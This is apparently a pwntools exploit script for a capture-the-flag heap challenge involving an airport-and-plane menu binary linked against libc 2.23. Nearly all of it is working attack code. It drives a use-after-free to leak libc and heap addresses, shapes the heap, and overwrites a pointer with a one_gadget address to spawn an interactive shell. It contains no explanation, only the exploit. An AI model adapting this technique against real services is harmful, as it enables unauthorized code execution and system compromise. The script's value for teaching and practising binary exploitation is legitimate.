from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def buyplane(typ, name):
    sla("Your choice: ", "1")
    sla("Your choice: ", str(typ))
    sla("Input the plane's name: ", name)

def buildairport(size, name):
    sla("Your choice: ", "2")
    sla("How long is the airport's name? ", str(size))
    sla("Please input the name: ", name)

def enterairport(name):
    sla("Your choice: ", "3")
    sla("Which airport do you want to choose? ", name)

def selectplane(name):
    sla("Your choice: ", "4")
    sla("Which plane do you want to choose? ", name)

def listplanes():
    sla("Your choice: ", "1")

def sellairport():
    sla("Your choice: ", "2")

def changeairport(name):
    sla("Your choice: ", "1")
    sla("which airport do you want to fly?", name)

def sellplane():
    sla("Your choice: ", "2")

def leaveselectplane():
    sla("Your choice: ", "3")

def leaveairport():
    sla("Your choice: ", "3")

buildairport(0x18, "A")
buildairport(0x18, "B")


buyplane(13, "Y")

selectplane("Y")
changeairport("1")
changeairport("0")
leaveselectplane()

enterairport("0")
sellairport()

enterairport("1")
listplanes()

ru("Build by ")
libc.address = uu64(6) - 0x3c4b78
ru("Docked at: ")
heap = uu64(6)
ic(hex(libc.address))
ic(hex(heap))
leaveairport()

buyplane(1, "X")

buildairport(0x18, "airport")
buyplane(1, "Z")
selectplane("Z")
changeairport("2")
pause()
leaveselectplane()
buyplane(1, "Y")

selectplane("Z")
sellplane()
selectplane("Y")
sellplane()
enterairport("2")
sellairport()

buildairport(0x48, p64(heap-0x48))
buildairport(0x48, "A"*0x48)
buildairport(0x48, "A"*0x48)
pause()

payload = p64(heap)*7
payload += p64(libc.address + 0x4526a)
buildairport(0x48, payload)
pause()

selectplane("X")
sellplane()

io.interactive()
